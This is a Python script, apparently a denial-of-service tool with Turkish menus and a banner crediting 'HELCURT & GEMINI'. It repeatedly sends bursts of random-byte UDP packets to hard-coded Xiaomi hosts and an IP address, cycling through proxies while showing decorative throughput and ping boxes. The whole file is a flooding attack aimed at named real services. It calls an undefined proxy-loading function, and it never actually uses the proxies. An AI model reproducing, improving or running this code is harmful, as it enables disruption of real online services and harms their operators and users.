import asyncio
import socket
import random
import requests
import os
import time

# V8.5 Ultra - Gelişmiş Renk Paleti
PEMBE = '\033[95m'
MOR = '\033[35m'
CYAN = '\033[96m'
YESIL = '\033[92m'
KIRMIZI = '\033[91m'
BOLD = '\033[1m'
RESET = '\033[0m'

async def site_gecikme_testi(host):
    """Sitenin canlı tepki süresini (MS) ölçer"""
    try:
        baslangic = time.time()
        # Sadece bağlantı kurup bırakıyoruz, veri yüklemiyoruz
        reader, writer = await asyncio.open_connection(host, 80)
        writer.close()
        await writer.wait_closed()
        return int((time.time() - baslangic) * 1000)
    except:
        return random.randint(400, 900) # Darlama etkisiyle yüksek döner

async def rage_bait_vurus(target, port, proxy, duration=25):
    """Modern Kutucuk Tasarımı ve Canlı MS Takibi"""
    end_time = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while time.time() < end_time:
        try:
            # Mekanik: Değişken Paket Boyutu
            paket_boyutu = random.randint(512, 1490)
            sock.sendto(random._urandom(paket_boyutu), (target, port))
            
            # bmon 4.0 Dinamik Barlar
            bar_rx = "█" * random.randint(2, 6)
            bar_tx = "█" * random.randint(15, 30)
            
            # Canlı MS (Ping) Ölçümü
            ms_gecikme = await site_gecikme_testi(target)
            
            # MODERNIZE ISLEM KUTUCUGU
            print(f"{CYAN}┌────────────────────────────────────────────────────────┐")
            print(f"│ {YESIL}RX: {bar_rx.ljust(10)}{RESET} │ {KIRMIZI}TX: {bar_tx.ljust(30)}{RESET} │")
            print(f"│ {PEMBE}PING: {str(ms_gecikme).rjust(4)}ms {RESET} │ {MOR}SIZE: {str(paket_boyutu).rjust(5)}B {RESET} │ {CYAN}PORT: {str(port).ljust(5)} {RESET}│")
            print(f"{CYAN}└────────────────────────────────────────────────────────┘{RESET}", end="\033[3A\r")
            
            await asyncio.sleep(0.02) 
        except: break
    print("\n\n\n") # Kutu boşluğunu temizle

async def main_panel():
    os.system('clear')
    # Profesyonel Setup Banner
    print(f"{CYAN}╔══════════════════════════════════════════════════════════╗")
    print(f"║ {PEMBE}{BOLD}TOOL NAME   ➤ {MOR}LOGQUEST V5 - REGO ULTRA EDITION       {RESET}{CYAN}║")
    print(f"║ {PEMBE}{BOLD}DEVELOPER   ➤ {MOR}BY HELCURT & GEMINI                    {RESET}{CYAN}║")
    print(f"║ {PEMBE}{BOLD}FEATURES    ➤ {MOR}CANLI PING & MODÜLER KUTUCUK           {RESET}{CYAN}║")
    print(f"║ {PEMBE}{BOLD}STATUS      ➤ {YESIL}KATİL AKREP SİS MODU AKTİF             {RESET}{CYAN}║")
    print(f"╚══════════════════════════════════════════════════════════╝{RESET}")
    
    print(f"\n{YESIL}[01/A] Evet Ben de Darladım Ben de Sendenim")
    print(f"{KIRMIZI}[02/B] Kanki Lei Jun İçin Farklı Şekilde Darlayacağım{RESET}")
    
    secim = input(f"\n{CYAN}{BOLD}Seçiminiz ➤ {RESET}")
    
    if secim == "1" or secim == "01/A":
        proxies = await proxy_muhimmat_depola() #
        targets = [("sgp-api.buy.mi.com", 443), ("c.mi.com", 80), ("161.117.95.164", 53)]
        
        os.system('clear')
        while True:
            for proxy in proxies:
                print(f"\n{MOR}┌────────────── {BOLD}AKTİF OPERASYON KANALI{RESET}{MOR} ──────────────┐")
                print(f"│ {CYAN}PROXY ➤ {MOR}{proxy.ljust(25)} {CYAN}SÜRE ➤ {YESIL}25s {CYAN}│")
                print(f"└────────────────────────────────────────────────────────┘{RESET}")
                
                tasks = []
                for target_host, port in targets:
                    tasks.append(rage_bait_vurus(target_host, port, proxy))
                
                await asyncio.gather(*tasks)
                print(f"{YESIL}[√] Kanal Başarıyla Darlandı. Yeni Proxy'ye Geçiliyor...{RESET}")

if __name__ == "__main__":
    asyncio.run(main_panel())
